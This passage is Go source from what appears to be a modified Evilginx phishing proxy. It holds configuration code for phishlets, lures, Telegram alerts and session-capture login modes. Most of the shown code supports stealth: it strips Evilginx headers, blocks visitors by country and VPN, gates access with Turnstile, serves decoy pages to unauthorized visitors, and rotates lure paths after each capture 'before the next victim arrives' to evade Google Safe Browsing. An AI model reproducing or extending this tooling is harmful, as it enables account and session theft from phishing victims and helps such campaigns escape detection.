		return fmt.Errorf("Telegram chat ID is not set")
	}
	if c.general.Teletoken == "" {
		return fmt.Errorf("Telegram bot token is not set")
	}
	return nil
}

func (c *Config) SetChatid(chatid string) {
	c.general.Chatid = chatid
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("Telegram Chat ID set to: %s", chatid)
	c.cfg.WriteConfig()
}

func (c *Config) SetTeletoken(token string) {
	c.general.Teletoken = token
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("Telegram Bot Token set to: %s", token)
	c.cfg.WriteConfig()
}

func (c *Config) SetStripHeaders(enabled bool) {
	c.general.StripHeaders = enabled
	c.cfg.Set(CFG_GENERAL, c.general)
	if enabled {
		log.Info("header stripping enabled - all Evilginx artifact headers will be removed")
	} else {
		log.Info("header stripping disabled")
	}
	c.cfg.WriteConfig()
}

func (c *Config) IsStripHeadersEnabled() bool {
	return c.general.StripHeaders
}

// Login prompt modes. off never touches the authorization request, so a visitor
// already signed in to the provider lands straight on the app: a session-only,
// anonymous capture unless they happen to be prompted anyway.
const (
	LOGIN_PROMPT_OFF            = "off"
	LOGIN_PROMPT_LOGIN          = "login"
	LOGIN_PROMPT_SELECT_ACCOUNT = "select_account"
)

var LOGIN_PROMPTS = []string{LOGIN_PROMPT_OFF, LOGIN_PROMPT_LOGIN, LOGIN_PROMPT_SELECT_ACCOUNT}

// NormalizeLoginPrompt maps the accepted spellings, including the legacy
// force_login booleans, onto a mode. It returns "" for an unrecognised or empty
// value, which callers read as "inherit the global setting".
func NormalizeLoginPrompt(v string) string {
	switch strings.ToLower(strings.TrimSpace(v)) {
	case LOGIN_PROMPT_OFF, "false", "no", "0":
		return LOGIN_PROMPT_OFF
	case LOGIN_PROMPT_LOGIN, "on", "true", "yes", "1":
		return LOGIN_PROMPT_LOGIN
	case LOGIN_PROMPT_SELECT_ACCOUNT, "select-account", "selectaccount":
		return LOGIN_PROMPT_SELECT_ACCOUNT
	}
	return ""
}

func (c *Config) GetLoginPrompt() string {
	if v := NormalizeLoginPrompt(c.general.LoginPrompt); v != "" {
		return v
	}
	// login_prompt unset: honour the legacy boolean rather than the zero value.
	if c.general.ForceLogin {
		return LOGIN_PROMPT_LOGIN
	}
	return LOGIN_PROMPT_OFF
}

// LoginPromptFor resolves the prompt mode for one visit. A per-lure override wins
// over the global setting; an empty lure value means inherit.
func (c *Config) LoginPromptFor(l *Lure) string {
	if l != nil {
		if v := NormalizeLoginPrompt(l.LoginPrompt); v != "" {
			return v
		}
	}
	return c.GetLoginPrompt()
}

// SetLoginPrompt stores the global mode and mirrors it into the legacy
// force_login boolean so pre-existing configs and tooling stay truthful.
func (c *Config) SetLoginPrompt(prompt string) error {
	v := NormalizeLoginPrompt(prompt)
	if v == "" {
		return fmt.Errorf("login_prompt: expected off, login or select_account (got %q)", prompt)
	}
	c.general.LoginPrompt = v
	c.general.ForceLogin = v != LOGIN_PROMPT_OFF
	c.cfg.Set("general.login_prompt", v)
	c.cfg.Set("general.force_login", c.general.ForceLogin)
	log.Info("login prompt set to '%s'", v)
	c.cfg.WriteConfig()
	return nil
}

// SetForceLogin is the legacy alias for SetLoginPrompt(login|off).
func (c *Config) SetForceLogin(enabled bool) {
	prompt := LOGIN_PROMPT_OFF
	if enabled {
		prompt = LOGIN_PROMPT_LOGIN
	}
	_ = c.SetLoginPrompt(prompt)
}

// IsForceLoginEnabled reports whether any prompt is applied, i.e. the mode is not
// off. Kept for the existing callers and for the legacy API field.
func (c *Config) IsForceLoginEnabled() bool {
	return c.GetLoginPrompt() != LOGIN_PROMPT_OFF
}

func (c *Config) GetStripHeadersStatus() string {
	if c.general.StripHeaders {
		return "on"
	}
	return "off"
}

func (c *Config) GetTelegramChatID() string {
	return c.general.Chatid
}

func (c *Config) GetTelegramBotToken() string {
	return c.general.Teletoken
}

func (c *Config) SetTelegramChatID(chatId string) {
	c.general.Chatid = chatId
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("Telegram Chat ID set to: %s", chatId)
	c.cfg.WriteConfig()
}

func (c *Config) SetTelegramBotToken(token string) {
	c.general.Teletoken = token
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("Telegram Bot Token set to: %s", token)
	c.cfg.WriteConfig()
}

func (c *Config) SetTelegramEnabled(enabled bool) {
	c.general.TelegramEnabled = enabled
	c.cfg.Set(CFG_GENERAL, c.general)
	if enabled {
		log.Info("Telegram notifications enabled")
	} else {
		log.Info("Telegram notifications disabled")
	}
	c.cfg.WriteConfig()
}

func (c *Config) GetTelegramEnabled() bool {
	return c.general.TelegramEnabled
}

func (c *Config) GetLureCount() int {
	return len(c.lures)
}

func (c *Config) GetHttpPort() int {
	if c.general.HttpPort == 0 {
		return 80
	}
	return c.general.HttpPort
}

func (c *Config) GetUnauthUrl() string {
	return c.general.UnauthUrl
}

// IsUnauthRedirectEnabled returns true when unauthorized/blocked requests should be
// answered with a 302 redirect to unauth_url rather than a rendered fake page.
func (c *Config) IsUnauthRedirectEnabled() bool {
	return c.general.UnauthRedirect
}

func (c *Config) SetUnauthRedirect(enabled bool) {
	c.general.UnauthRedirect = enabled
	c.cfg.Set(CFG_GENERAL, c.general)
	if enabled {
		log.Info("unauthorized requests will be redirected (302) to unauth_url")
	} else {
		log.Info("unauthorized requests will be served a rendered copy of unauth_url")
	}
	c.cfg.WriteConfig()
}

func (c *Config) GetLureGenerationStrategy() string {
	return "random"
}

func (c *Config) SetHttpPort(port int) {
	c.general.HttpPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

// PhishletSiteFromFile maps a file in the phishlets directory to its site name.
//
// Only an exact "<site>.yaml" counts. A loose regex also accepts backups such as
// "o365new.yaml.bak-opt", which resolve to the same site name as the real file:
// both load, the alphabetically later directory entry wins, and editing the
// visible file then appears to have no effect.
func PhishletSiteFromFile(filename string) (string, bool) {
	if !strings.HasSuffix(filename, ".yaml") {
		return "", false
	}
	name := strings.TrimSuffix(filename, ".yaml")
	if name == "" {
		return "", false
	}
	return name, true
}

// PhishletFile is one loadable file found in the phishlets directory.
type PhishletFile struct {
	Site string
	Path string
}

// ScanPhishletsDir lists the phishlets in dir and reports, loudly, every file it
// refuses to load.
//
// Only an exact "<site>.yaml" is a phishlet. A backup such as
// "o365new.yaml.bak-opt" used to match the loose regex
// "([a-zA-Z0-9-.]*)\.yaml", so it resolved to the same site name as the real
// file: both loaded, the alphabetically later directory entry silently won, and
// editing the visible file then appeared to do nothing. The same pass reports two
// files claiming one site, which is the remaining shadowing case.
func ScanPhishletsDir(dir string) ([]PhishletFile, []string, error) {
	files, err := os.ReadDir(dir)
	if err != nil {
		return nil, nil, err
	}
	var out []PhishletFile
	var warnings []string
	seen := map[string]string{}
	for _, f := range files {
		if f.IsDir() {
			continue
		}
		name := f.Name()
		site, ok := PhishletSiteFromFile(name)
		if !ok {
			// only bother about files that look like a phishlet
			if strings.Contains(strings.ToLower(name), ".yaml") {
				warnings = append(warnings, fmt.Sprintf("ignoring '%s': not a '<site>.yaml' file, so it is not loaded (backup or stray file)", name))
			}
			continue
		}
		if prev, dup := seen[site]; dup {
			warnings = append(warnings, fmt.Sprintf("'%s' and '%s' both map to phishlet '%s': '%s' wins and '%s' is shadowed", prev, name, site, name, prev))
		}
		seen[site] = name
		out = append(out, PhishletFile{Site: site, Path: filepath.Join(dir, name)})
	}
	sort.Slice(warnings, func(i, j int) bool { return warnings[i] < warnings[j] })
	return out, warnings, nil
}

// DuplicatePhishSubs reports phish_subdomain values declared by more than one
// proxy host of this phishlet.
//
// A duplicate phish_sub means two origin hosts share one phished hostname, and
// the reverse mapping is then decided by declaration order: the inbound request
// path (replaceHostWithOriginal) returns the first match while the body rewriter
// (patchUrls) keeps the last. Which origin a phished hostname resolves to is
// therefore silent and inconsistent. Loading still succeeds, because stock
// phishlets rely on it.
func (p *Phishlet) DuplicatePhishSubs() []string {
	bySub := map[string][]string{}
	for _, ph := range p.proxyHosts {
		orig := combineHost(ph.orig_subdomain, ph.domain)
		bySub[ph.phish_subdomain] = append(bySub[ph.phish_subdomain], orig)
	}
	var subs []string
	for sub, origs := range bySub {
		if len(origs) > 1 {
			subs = append(subs, sub)
		}
	}
	sort.Strings(subs)
	var out []string
	for _, sub := range subs {
		origs := bySub[sub]
		sort.Strings(origs)
		label := sub
		if label == "" {
			label = "(empty)"
		}
		out = append(out, fmt.Sprintf("phish_sub '%s' is declared by %d hosts (%s): the first wins inbound, the last wins in body rewrites",
			label, len(origs), strings.Join(origs, ", ")))
	}
	return out
}

func (c *Config) GetPhishletsDir() string {
	if c.phishletsDir != "" {
		return c.phishletsDir
	}
	return "phishlets"
}

func GenRandomLureString(strategy string) string {
	switch strategy {
	case "random":
		return GenRandomString(8)
	default:
		return GenRandomString(8)
	}
}

func AutomateCampaignFromLure(baseURL string, phishletName string, cfg *Config) {
	log.Info("Campaign automation placeholder: lure=%s phishlet=%s (configure GoPhish for full automation)", baseURL, phishletName)
}

// =============================================================================
// GEOIP CONFIGURATION METHODS — ADD AT THE VERY END OF THE FILE
// =============================================================================

// SetGeoIP stores the GeoIP database instance for use by HttpProxy and other components.
func (c *Config) SetGeoIP(g *GeoIPDatabase) {
	globalConfigMu.Lock()
	defer globalConfigMu.Unlock()
	globalGeoIP = g
}

// GetGeoIP returns the GeoIP database instance, or nil if not configured.
func (c *Config) GetGeoIP() *GeoIPDatabase {
	globalConfigMu.RLock()
	defer globalConfigMu.RUnlock()
	return globalGeoIP
}

// SetBlockVPN enables or disables automatic blocking of VPN/proxy/datacenter visitors.
func (c *Config) SetBlockVPN(block bool) {
	globalConfigMu.Lock()
	defer globalConfigMu.Unlock()
	globalBlockVPN = block
}

// GetBlockVPN returns whether VPN/proxy/datacenter blocking is enabled.
func (c *Config) GetBlockVPN() bool {
	globalConfigMu.RLock()
	defer globalConfigMu.RUnlock()
	return globalBlockVPN
}

// SetBlockedCountries stores the list of country ISO codes to block.
func (c *Config) SetBlockedCountries(countries []string) {
	globalConfigMu.Lock()
	defer globalConfigMu.Unlock()
	globalBlockedCountries = countries
}

// GetBlockedCountries returns the list of blocked country ISO codes.
func (c *Config) GetBlockedCountries() []string {
	globalConfigMu.RLock()
	defer globalConfigMu.RUnlock()
	return globalBlockedCountries
}

// --- Dashboard subdomain ---

func (c *Config) SetDashboardSubdomain(sub string) {
	c.general.DashboardSubdomain = sub
	c.cfg.Set("general.dashboard_sub", sub)
	c.cfg.WriteConfig()
}

func (c *Config) GetDashboardSubdomain() string {
	return c.general.DashboardSubdomain
}

// GetDashboardHost returns the full hostname for the dashboard virtual host,
// or "" if no subdomain is configured or no base domain is set.
func (c *Config) GetDashboardHost() string {
	sub := c.general.DashboardSubdomain
	domain := c.general.Domain
	if sub == "" || domain == "" {
		return ""
	}
	return sub + "." + domain
}

func (c *Config) SetDashboardUser(user string) {
	c.general.DashboardUser = user
	c.cfg.Set("general.dashboard_user", user)
	c.cfg.WriteConfig()
}

func (c *Config) GetDashboardUser() string {
	return c.general.DashboardUser
}

func (c *Config) SetDashboardPass(pass string) {
	c.general.DashboardPass = pass
	c.cfg.Set("general.dashboard_pass", pass)
	c.cfg.WriteConfig()
}

func (c *Config) GetDashboardPass() string {
	return c.general.DashboardPass
}

// --- Cloudflare Turnstile ---

func (c *Config) SetTurnstileKeys(siteKey, secretKey string) {
	c.general.TurnstileSiteKey = siteKey
	c.general.TurnstileSecretKey = secretKey
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) GetTurnstileSiteKey() string {
	return c.general.TurnstileSiteKey
}

func (c *Config) GetTurnstileSecretKey() string {
	return c.general.TurnstileSecretKey
}

// --- Redirect pages ---

func (c *Config) SetRedirectsDir(dir string) {
	c.redirectsDir = dir
}

func (c *Config) GetRedirectsDir() string {
	return c.redirectsDir
}

func (c *Config) GetRedirectPages() []*RedirectPage {
	return c.redirectPages
}

func (c *Config) GetRedirectPageByHost(host string) *RedirectPage {
	domain := c.general.Domain
	if domain == "" {
		return nil
	}
	for _, rp := range c.redirectPages {
		if rp.Subdomain+"."+domain == host {
			return rp
		}
	}
	return nil
}

func (c *Config) AddRedirectPage(rp *RedirectPage) {
	c.redirectPages = append(c.redirectPages, rp)
	c.cfg.Set(CFG_REDIRECTS, c.redirectPages)
	c.cfg.WriteConfig()
}

func (c *Config) DeleteRedirectPage(idx int) error {
	if idx < 0 || idx >= len(c.redirectPages) {
		return fmt.Errorf("index out of bounds: %d", idx)
	}
	c.redirectPages = append(c.redirectPages[:idx], c.redirectPages[idx+1:]...)
	c.cfg.Set(CFG_REDIRECTS, c.redirectPages)
	c.cfg.WriteConfig()
	return nil
}

// RotateAutolureForSession immediately rotates the autolure that served the
// given session. Called on full capture so the burned path is replaced before
// the next victim arrives, limiting Google ESB's ability to flag a persistent URL.
func (c *Config) RotateAutolureForSession(phishLure *Lure) {
	if phishLure == nil || !phishLure.AutoRotate {
		return
	}
	now := time.Now().Unix()
	for i, l := range c.lures {
		if l.AutoRotate && strings.EqualFold(l.Hostname, phishLure.Hostname) {
			oldPath := l.Path
			newPath := "/" + GenRandomString(8)
			l.Path = newPath
			if l.RotateInterval > 0 {
				l.NextRotate = now + l.RotateInterval
			} else {
				l.NextRotate = now + 2700 + rand.Int63n(2700)
			}
			if err := c.SetLure(i, l); err == nil {
				log.Info("[autolure] [%s] capture-triggered rotation: %s → %s", l.Phishlet, oldPath, newPath)
			}
			return
		}
	}
}
